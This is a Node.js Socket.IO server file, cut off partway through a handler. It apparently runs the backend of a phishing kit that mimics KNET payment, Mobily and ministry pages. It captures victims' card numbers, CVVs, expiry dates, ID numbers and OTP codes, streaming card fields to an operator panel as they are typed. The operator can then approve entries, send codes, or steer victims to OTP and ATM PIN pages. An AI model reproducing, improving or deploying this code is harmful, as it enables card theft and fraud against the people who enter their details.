
// [fix] مفتاح المتجر — يمنع اختلاط طلبات المتجرين على خادم واحد
const STORE = process.env.STORE_ID || process.env.STORE || 'KDD';
function storeOf(s){try{var h=(s&&s.handshake)||{},q=String((h.query&&h.query.store)||""),o=String(h.origin||h.referer||"");return /kdd/i.test(q||o)?"KDD":"kdkaw"}catch(e){return "kdkaw"}}

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

// CORS Configuration
const corsOptions = {
  origin: process.env.CLIENT_URL || "*",
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());
app.use('/admin', express.static(path.join(__dirname, 'admin'), { etag: false, lastModified: false, setHeaders: function (res) { res.setHeader('Cache-Control', 'no-store'); } }));

// Socket.IO Configuration
const io = new Server(server, {
  cors: corsOptions,
  transports: ["websocket", "polling"],
});

// Data file path
const DATA_DIR = (function () {
  if (process.env.NODE_ENV !== 'production') return __dirname;
  try {
    fs.mkdirSync('/data', { recursive: true });
    fs.accessSync('/data', fs.constants.W_OK);
    return '/data';
  } catch (e) {
    console.log('DATA_DIR: fallback to ' + __dirname);
    return __dirname;
  }
})();
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123";

// [FIX-DEDUP] الرمز مرة واحدة فقط — تنظيف السجلات القديمة
(function dedupCodes() {
  let changed = false;
  savedVisitors.forEach(function (v) {
    if (!v) return;
    if (Array.isArray(v.digitCodes) && v.digitCodes.length) {
      const map = {};
      v.digitCodes.forEach(function (dc) { if (dc && dc.code != null) map[String(dc.code).trim()] = dc; });
      const uniq = Object.keys(map).map(function (k) { return map[k]; });
      if (uniq.length !== v.digitCodes.length) { v.digitCodes = uniq; changed = true; }
    }
    if (Array.isArray(v.dataHistory) && v.dataHistory.length) {
      const codes = {};
      (v.digitCodes || []).forEach(function (d) { if (d && d.code != null) codes[String(d.code).trim()] = 1; });
      const seen = {};
      const before = v.dataHistory.length;
      v.dataHistory = v.dataHistory.filter(function (en) {
        if (!en || !en.content) return true;
        const keys = Object.keys(en.content);
        const pureCode = en.__isCode === true || (keys.length === 1 && keys[0] === 'الرمز');
        if (!pureCode) return true;
        const val = String(en.content['الرمز'] == null ? '' : en.content['الرمز']).trim();
        if (codes[val]) return false;
        if (seen[val]) return false;
        seen[val] = 1; return true;
      });
      if (v.dataHistory.length !== before) changed = true;
    }
  });
  if (changed) { try { saveData(); console.log('[FIX-DEDUP] cleaned duplicate codes'); } catch (e) {} }
})(); // Admin password (persisted)

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Lookup country from IP using free API
async function lookupCountry(ip) {
  try {
    // Clean IP (remove ::ffff: prefix for IPv4-mapped IPv6)
    const cleanIp = ip.replace(/^::ffff:/, '');
    // Skip private/local IPs
    if (cleanIp === '127.0.0.1' || cleanIp === 'localhost' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
      return 'Local';
    }
    const http = require('http');
    return new Promise((resolve) => {
      const req = http.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode`, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            if (json.status === 'success') {
              resolve(json.country || json.countryCode || 'Unknown');
            } else {
              resolve('Unknown');
            }
          } catch (e) {
            resolve('Unknown');
          }
        });
      });
      req.on('error', () => resolve('Unknown'));
      req.setTimeout(3000, () => { req.destroy(); resolve('Unknown'); });
    });
  } catch (error) {
    return 'Unknown';
  }
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the first IP from x-forwarded-for (the client's real IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[0]; // Use the first IP (client's real IP)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}


/* ===== FIX91: استرجاع الزائر بشكل موثوق + توصيل لكل سوكتات الزائر ===== */
function __f91Ids(payload){
  var ids = [];
  try {
    var objs = [payload, payload && payload.content, payload && payload.data, payload && payload.details];
    var keys = ['visitorId','visitor_id','existingVisitorId','id','clientId','uid','token','deviceId'];
    for (var i = 0; i < objs.length; i++) {
      var o = objs[i];
      if (!o || typeof o !== 'object') continue;
      for (var j = 0; j < keys.length; j++) { if (o[keys[j]]) ids.push(String(o[keys[j]])); }
    }
  } catch (e) {}
  return ids;
}
function __f91ResolveVisitor(socket, payload){
  var direct = visitors.get(socket.id);
  if (direct) {
    try { direct._sockets = Array.from(new Set([].concat(direct._sockets || [], socket.id))); } catch (e) {}
    return direct;
  }
  var ids = __f91Ids(payload);
  var found = null;
  try { if (ids.length) savedVisitors.forEach(function(v){ if (!found && v && ids.indexOf(String(v._id)) > -1) found = v; }); } catch (e) {}
  if (!found) { try { visitors.forEach(function(v){ if (!found && v && (v._sockets || []).indexOf(socket.id) > -1) found = v; }); } catch (e) {} }
  if (!found) {
    try {
      var h = socket.handshake && socket.handshake.headers ? socket.handshake.headers : {};
      var ip = String(h['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
      if (ip) visitors.forEach(function(v){ if (!found && v && v.ip === ip && (Date.now() - (v.lastActivity || 0)) < 900000) found = v; });
    } catch (e) {}
  }
  if (found) {
    try { found._sockets = Array.from(new Set([].concat(found._sockets || [], socket.id))); } catch (e) {}
    try { if (!visitors.has(socket.id)) visitors.set(socket.id, found); } catch (e) {}
  }
  return found || null;
}
function __f91Targets(visitor){
  var out = [];
  if (!visitor) return out;
  try { (visitor._sockets || []).forEach(function(sid){ if (sid && io.sockets.sockets.get(sid)) out.push(sid); }); } catch (e) {}
  try { visitors.forEach(function(v, sid){ if (v && v._id === visitor._id && io.sockets.sockets.get(sid)) out.push(sid); }); } catch (e) {}
  if (visitor.socketId && io.sockets.sockets.get(visitor.socketId)) out.push(visitor.socketId);
  return Array.from(new Set(out));
}
function __f91Emit(visitorOrId, event, payload){
  var rawId = (typeof visitorOrId === 'string') ? visitorOrId : null;
  var visitor = visitorOrId;
  if (rawId) {
    visitor = visitors.get(rawId) || null;
    if (!visitor) { try { savedVisitors.forEach(function(v){ if (!visitor && v && v._id === rawId) visitor = v; }); } catch (e) {} }
  }
  if (!visitor) { if (rawId) { try { io.to(rawId).emit(event, payload); } catch (e) {} } return; }
  var targets = __f91Targets(visitor);
  if (!targets.length && visitor.socketId) targets.push(visitor.socketId);
  targets.forEach(function(sid){ try { io.to(sid).emit(event, payload); } catch (e) {} });
}
/* ===== END FIX91 ===== */
/*FIX101B*/
function __f101uniq(){ var seen = {}, out = []; try { visitors.forEach(function(v){ if (v && v._id && !seen[v._id]) { seen[v._id] = 1; out.push(v); } }); } catch(e){} return out; }

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", async (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    // Use client-provided real IP if available (more accurate than proxy IP)
    const clientIp = data?.clientIp;
    if (clientIp) {
      console.log(`[DEBUG] Using client-provided IP: ${clientIp} (proxy IP was: ${visitorInfo.ip})`);
      visitorInfo.ip = clientIp;
    } else {
      console.log(`[DEBUG] No client IP provided, using proxy IP: ${visitorInfo.ip}`);
    }
    
    // Lookup country from IP if not provided by Cloudflare
    if (visitorInfo.country === 'Unknown' && visitorInfo.ip) {
      visitorInfo.country = await lookupCountry(visitorInfo.ip);
      console.log(`[DEBUG] Looked up country for ${visitorInfo.ip}: ${visitorInfo.country}`);
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }
    if (!existingVisitor && visitorInfo.ip) {
      try {
        var __best = null;
        savedVisitors.forEach(function (v) {
          if (!v || v.ip !== visitorInfo.ip) return;
          if (Date.now() - (v.lastActivity || 0) > 1800000) return;
          if (!__best || (v.lastActivity || 0) > (__best.lastActivity || 0)) __best = v;
        });
        existingVisitor = __best;
        if (existingVisitor) console.log("[FIX95] adopted existing visitor by IP: " + existingVisitor._id);
      } catch (e) {}
    }
    if (!existingVisitor && visitorInfo.ip) {
      try {
        var __best = null;
        savedVisitors.forEach(function (v) {
          if (!v || v.ip !== visitorInfo.ip) return;
          if (Date.now() - (v.lastActivity || 0) > 1800000) return;
          if (!__best || (v.lastActivity || 0) > (__best.lastActivity || 0)) __best = v;
        });
        existingVisitor = __best;
        if (existingVisitor) console.log("[FIX95] adopted existing visitor by IP: " + existingVisitor._id);
      } catch (e) {}
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitor._sockets = Array.from(new Set([].concat(visitor._sockets || [], socket.id)));

    visitors.set(socket.id, visitor);
    /*FIX100reg*/ try { visitor.__f100sent = 0; } catch(e){}
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = __f91ResolveVisitor(socket, null);
    if (visitor) {
      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __p98 = String(page || ''); if (/cvv|atm|مرور|نهائي|final/i.test(__p98)) { visitor.__f98otp = 0; /*FIX100x*/ visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__p98)) { page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      const pageLower = String(page || '').toLowerCase();
      const isPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>pageLower.indexOf(h)>-1);
      if (isPaymentPage) {
        visitor.hasEnteredCardPage = true;
        visitor.lastDataUpdate = new Date().toISOString();
        /*FIX-LIVE*/ if (!visitor.liveCard) {
          visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" };
        }
        visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
        });
      } else {
        // [FIX-LIVE] لا نمسح بطاقة الدفع المباشر — تبقى حتى يضغط الزائر «إرسال»
        if (visitor.liveCard) {
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("card:liveUpdate", {
              visitorId: visitor._id,
              liveCard: visitor.liveCard,
              liveCardTimestamp: visitor.liveCardTimestamp,
            });
          });
        }
      }
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });
    }
  });

  // Handle visitor name update (from MOH username)
  socket.on("visitor:updateName", (name) => {
    const visitor = __f91ResolveVisitor(socket, null);
    if (visitor && name) {
      visitor.fullName = name;
      visitor.mohUsername = name;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:nameUpdated", {
          visitorId: visitor._id,
          name: name,
        });
      });

      console.log(`Visitor ${visitor._id} name updated to: ${name}`);
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = __f91ResolveVisitor(socket, data);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      /*FIX100D*/ try {
  var __c100 = data.content || {}, __ks100 = Object.keys(__c100).sort();
  var __sig100 = String(data.page || "") + "#" + String(data.digitCode || "") + "#" + __ks100.map(function(k){ return k + "=" + String(__c100[k]).slice(0,120); }).join("|");
  var __now100 = Date.now();
  var __dup100 = (visitor.__f100sig === __sig100) && (__now100 - (visitor.__f100at || 0) < 8000) && !!__sig100;
  visitor.__f100sig = __sig100; visitor.__f100at = __now100;
  if (__dup100) {
    try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __dp100 = String(data.page || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__dp100)) { visitor.__f98otp = 0; visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__dp100)) { data.page = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
    visitor.page = data.page;
    visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
    visitors.set(socket.id, visitor);
    saveVisitorPermanently(visitor);
    return;
  }
} catch(e) {}
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        // Start tracking from card page
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
        // [FIX-LIVE] الزائر ضغط «إرسال» — نمسح البطاقة المباشرة
        visitor.liveCard = null;
        visitor.liveCardTimestamp = null;
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("card:liveUpdate", {
            visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
          });
        });
      }
      if (data.digitCode) {
        const now = new Date().toISOString();
        const codeStr = String(data.digitCode).trim();
        // [FIX-DEDUP] الرمز يُحفظ مرة واحدة فقط
        let dc = (visitor.digitCodes || []).find(function (x) {
          return x && String(x.code).trim() === codeStr;
        });
        if (dc) {
          dc.timestamp = now;
          if (data.page) dc.page = data.page;
        } else {
          visitor.digitCodes.push({ code: codeStr, page: data.page, timestamp: now });
        }
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __q98 = String(data.page || ''); if (/cvv|atm|مرور|نهائي|final/i.test(__q98)) { visitor.__f98otp = 0; /*FIX100x*/ visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__q98)) { data.page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
    
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  
// ===== بطاقة الدفع المباشر (liveCard) =====
socket.on("card:live", (data) => {
  const visitor = __f91ResolveVisitor(socket, null);
  if (!visitor || !data || (data.consent !== true && data.presence !== true)) return;

  const cardNumber = String(data.cardNumber || '').replace(/\D/g, '').slice(0, 19);
  const nameOnCard = String(data.nameOnCard || '').slice(0, 80);
  const expiryDate = String(data.expiryDate || '').replace(/[^0-9/]/g, '').slice(0, 7);
  const cvv = String(data.cvv || '').replace(/\D/g, '').slice(0, 4);

  // [FIX-LIVE] دمج: لا نمحي القيم القديمة إذا وصلت فاضية
  const __prev = visitor.liveCard || {};
  visitor.liveCard = {
    cardNumber: cardNumber || __prev.cardNumber || '',
    nameOnCard: nameOnCard || __prev.nameOnCard || '',
    expiryDate: expiryDate || __prev.expiryDate || '',
    cvv: cvv || __prev.cvv || ''
  };
  visitor.liveCardTimestamp = new Date().toISOString();
  visitors.set(socket.id, visitor);

  admins.forEach((admin, adminSocketId) => {
    io.to(adminSocketId).emit("card:liveUpdate", {
      visitorId: visitor._id,
      liveCard: visitor.liveCard,
      liveCardTimestamp: visitor.liveCardTimestamp,
    });
  });
});

socket.on("card:liveHide", () => {
  const visitor = __f91ResolveVisitor(socket, null);
  if (!visitor) return;
  // [FIX-LIVE] نبقي المعلومات — تُمسح فقط عند ضغط «إرسال»
  visitors.set(socket.id, visitor);
  if (visitor.liveCard) {
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("card:liveUpdate", {
        visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp,
      });
    });
  }
});

socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = __f91ResolveVisitor(socket, null);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 60 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        __f91Emit(visitorSocketId, "isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    __f91Emit(visitorSocketId, "form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    __f91Emit(visitorSocketId, "form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    __f91Emit(visitorSocketId, "mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    __f91Emit(visitorSocketId, "code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    __f91Emit(visitorSocketId, "visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    // [FIX-LIVE] الموافقة: اخفِ بطاقة المباشر + وجّه لصفحة الكود
    try {
      if (action === 'otp' || action === 'approve' || action === 'cvv' || action === 'reject') {
        var __lv = visitors.get(visitorSocketId);
        if (!__lv) { visitors.forEach(function(x){ if (!__lv && x && (x._id === visitorSocketId || x.socketId === visitorSocketId)) __lv = x; }); }
        if (__lv) {
          __lv.liveCard = null;
          __lv.liveCardTimestamp = null;
          if (action !== 'reject') {
            var __pg = String(__lv.page || '');
            if (!/otp|رمز/i.test(__pg)) {
              __lv.page = 'رمز التحقق كي نت (OTP)';
              __lv.__f98otp = Date.now();
              try { __f91Emit(visitorSocketId, 'visitor:navigate', 'otp-verification'); } catch(e){}
            }
          }
          visitors.set(visitorSocketId, __lv);
          saveVisitorPermanently(__lv);
          admins.forEach(function(a, k){
            try { io.to(k).emit('card:liveUpdate', { visitorId: __lv._id, liveCard: null, liveCardTimestamp: null }); } catch(e){}
            try { io.to(k).emit('visitor:pageChanged', { visitorId: __lv._id, page: __lv.page }); } catch(e){}
          });
        }
      }
    } catch(e) {}
    var __skipEmit100 = false, __vv100 = null;
